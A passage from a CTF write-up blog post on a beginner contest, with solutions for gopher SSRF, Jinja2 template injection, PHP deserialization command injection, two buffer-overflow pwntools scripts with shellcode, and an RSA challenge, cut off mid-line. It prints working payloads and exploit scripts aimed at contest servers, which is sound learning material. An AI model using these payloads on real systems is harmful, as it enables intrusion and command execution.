@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allThis CTF for beginners just popped up on SCINT, and I’m so busy currently so I didn’t participate the CTF seriously.But some problems are interesting and I still learned from them, down belo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCKUCTF Write Up">
+<meta property="og:url" content="http://wha13.github.io/2023/09/23/NCKUCTF/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allThis CTF for beginners just popped up on SCINT, and I’m so busy currently so I didn’t participate the CTF seriously.But some problems are interesting and I still learned from them, down belo">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-09-24T03:56:38.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="RSA">
+<meta property="article:tag" content="BOF">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="gopher">
+<meta property="article:tag" content="ret2shellcode">
+<meta property="article:tag" content="serialization">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NCKUCTF Write Up</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/09/27/cybertea/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/09/21/picoctf-rsa/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/09/23/NCKUCTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/09/23/NCKUCTF/&text=NCKUCTF Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/09/23/NCKUCTF/&is_video=false&description=NCKUCTF Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NCKUCTF Write Up&body=Check out this article: http://wha13.github.io/2023/09/23/NCKUCTF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/09/23/NCKUCTF/&title=NCKUCTF Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/09/23/NCKUCTF/&name=NCKUCTF Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/09/23/NCKUCTF/&t=NCKUCTF Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preview-Card"><span class="toc-number">2.1.</span> <span class="toc-text">Preview Card</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2"><span class="toc-number">2.2.</span> <span class="toc-text">Jinja2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cat"><span class="toc-number">2.3.</span> <span class="toc-text">Cat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Yet-Another-Username-Password-Checker"><span class="toc-number">2.4.</span> <span class="toc-text">Yet Another Username Password Checker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">2.5.</span> <span class="toc-text">bof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#puRely-high-School-mAth"><span class="toc-number">2.6.</span> <span class="toc-text">puRely high School mAth</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NCKUCTF Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-24T03:56:38.000Z" class="dt-published" itemprop="datePublished">2023-09-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/BOF/" rel="tag">BOF</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/ROP/" rel="tag">ROP</a>, <a class="p-category" href="/tags/RSA/" rel="tag">RSA</a>, <a class="p-category" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="p-category" href="/tags/SSTI/" rel="tag">SSTI</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/gopher/" rel="tag">gopher</a>, <a class="p-category" href="/tags/ret2shellcode/" rel="tag">ret2shellcode</a>, <a class="p-category" href="/tags/serialization/" rel="tag">serialization</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h1><p>This CTF for beginners just popped up on SCINT, and I’m so busy currently so I didn’t participate the CTF seriously.<br>But some problems are interesting and I still learned from them, down below are the write ups~  </p>
+<h1 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h1><h2 id="Preview-Card"><a href="#Preview-Card" class="headerlink" title="Preview Card"></a>Preview Card</h2><p>A gopher SSRF!!!<br>The main reason I want to have this writeup!<br>The home page of it has only two links, one is the flag but only localhost can read it, and the other is a kink like this:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://preview.ctfd.nckuctf.org/preview.php?url=http://sample.com</span><br></pre></td></tr></table></figure>
+<p>I tried it and found out a XSS, and I was like, “Well, is ther an admin bot?”<br>The answer is NO!<br>After many different tries, I gave it up and check out the hint:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is SSRF, what is gopher</span><br></pre></td></tr></table></figure>
+<p>Ok, ok, I know what is SSRF, but WTH is gopher.<br>Gopher is an protocal before http, which are commonly known for their extensive tunneling activities and their ability to destroy farms and gardens.(From wikipedia :D)<br>The exploit for this challenge is to send a post request asking for localhost by gopher and see the sesults from debug on the page.<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">link about gopher ssrf</a><br><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">payload generator</a><br>My first payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:127.0.0.1%0d%0AContent-Type%3A%20application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+<p>and i got a request like this:  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">22</span> Sep <span class="number">2023</span> <span class="number">14</span>:<span class="number">50</span>:<span class="number">19</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">54</span> (Debian)</span><br><span class="line">X-Powered-By: PHP/<span class="number">7.4</span>.<span class="number">33</span></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: <span class="number">149</span></span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    Do you want the FLAG? &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;givemeflag&quot;</span> value=<span class="string">&quot;no&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>Well…. I have to post a data as givemeflag&#x3D;yes  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:127.0.0.1%0d%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2014%0D%0A%0D%0Agivemeflag%3Dyes</span><br></pre></td></tr></table></figure>
+<p>flag popped!!!  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">22</span> Sep <span class="number">2023</span> <span class="number">12</span>:<span class="number">32</span>:<span class="number">52</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">54</span> (Debian)</span><br><span class="line">X-Powered-By: PHP/<span class="number">7.4</span>.<span class="number">33</span></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: <span class="number">183</span></span><br><span class="line">Content-Type: text/html; charset=UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    Do you want the FLAG? &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;givemeflag&quot;</span> value=<span class="string">&quot;no&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">FLAG:NCKUCTF&#123;SSRF_Sneaky_Requests&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p>A SSTI (Server Side Template Injection), but since I’m not familiar with flask that much, so I googled the payload…….<br><a target="_blank" rel="noopener" href="https://github.com/payloadbox/ssti-payloads">SSTI payloads</a><br>The principle of SSTI is that the frame Jinja2 would describe a string with this pattern (<code>&#123;&#123;.*&#125;&#125;</code>) as a template element, and it could be Inject by connect some builtin magics to become RCE<br>my payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cd ../;cat th1s_15_fl4ggggggg&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>The source:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;Your name&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button&gt;submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;/source&quot;&gt;Source code&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome_message</span>():</span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&lt;p&gt;Hello, &quot;</span> + name + <span class="string">&quot;&lt;/p&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/source&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__, mimetype=<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(threaded=<span class="literal">True</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>An php serialization+command injection.<br>The soucre:  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]) &amp;&amp; <span class="keyword">die</span>(!<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;(guest cat)&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cowsay &#x27;Welcome back, <span class="subst">$this</span>-&gt;name&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cat_session&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cat</span> = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;cat_&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">0xffff</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;cat_session&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cat</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$cat</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cat_session&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;Hello, <span class="meta">&lt;?=</span> <span class="variable">$cat</span>-&gt;name <span class="meta">?&gt;</span>.&lt;/p&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;/?source&quot;</span>&gt;source code&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>and I was provided a cookie like this:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czo5OiJjYXRfMzIzMzciO30%3D</span><br></pre></td></tr></table></figure>
+<p>What it looks like after base64 decoded:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Cat&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;cat_32337&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>I just wanted to chamge my payload <code>cat_32337</code> into <code>cat_322337&#39;; ls echo &#39;a</code>.<br>But that didn’t work!<br>After a few minutes, I realized that it was a php serialization string, and in this payload, <code>s:9:”cat_32337”</code> represent a string object, size of 9 and the value is <code>“cat_32337”</code>, so I also need to change my size value XD<br>My payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czo2MToiY2F0XzM0MzQ3JyYmIGNkIC4uLy4uLy4uLyAmJmNhdCBmbGFnXzVmYjJhY2ViZjFkMGM1NTgmJmVjaG8nYSI7fQ==</span><br></pre></td></tr></table></figure>
+<p>What it looks like after base64 decoded:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Cat&quot;:1:&#123;s:4:&quot;name&quot;;s:61:&quot;cat_34347&#x27;&amp;&amp; cd ../../../ &amp;&amp;cat flag_5fb2acebf1d0c558&amp;&amp;echo&#x27;a&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>Rahh!!!!</p>
+<h2 id="Yet-Another-Username-Password-Checker"><a href="#Yet-Another-Username-Password-Checker" class="headerlink" title="Yet Another Username Password Checker"></a>Yet Another Username Password Checker</h2><p><a target="_blank" rel="noopener" href="https://github.com/William957-web/Daily/raw/main/passwds%20(1)">Challenge file</a><br>This challenge allow two inputs, and it’s without stack canary and PIE, so it allows an ret2shellcode exploit.<br>Method:<br>First make the global variable become a shellcode get from exploit-db, and ret to the shellcode by BOF while inputing the second variable.<br>My solve script:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=<span class="string">&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">r=remote(<span class="string">&#x27;140.116.246.190&#x27;</span>, <span class="number">15552</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ret2sc&#x27;)</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0x404080</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">s=r.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>p.s. I’m so cinfused that I consider ret2shellcode as a kind of BOF, but the flag and some other websites said that it’s a kind of ROP……  </p>
+<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p><a target="_blank" rel="noopener" href="https://github.com/William957-web/Daily/raw/main/bof%20(2)">Challenge file</a><br>Just bof with ret2code~~~<br>My solve script:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;140.116.246.190&#x27;</span>, <span class="number">15553</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    s=r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">addr=<span class="number">0x4011b6</span></span><br><span class="line">padding=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">r.sendline(padding+p64(addr))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="puRely-high-School-mAth"><a href="#puRely-high-School-mAth" class="headerlink" title="puRely high School mAth"></a>puRely high School mAth</h2><p>An RSA with five primes and a formula with five roots of the primes.<br>solution:phi(n)&#x2F;totient(n)&#x3D;f(1)*-1<br>An easy but quite creative one.<br>Challenge source:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> P</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">primes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    primes.append(getPrime(<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">pt = bytes_to_long(FLAG)</span><br><span class="line">N = primes[<span class="number">0</span>] * primes[<span class="number">1</span>] * primes[<span class="number">2</span>] * primes[<span class="number">3</span>] * primes[<span class="number">4</span>]</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(pt, 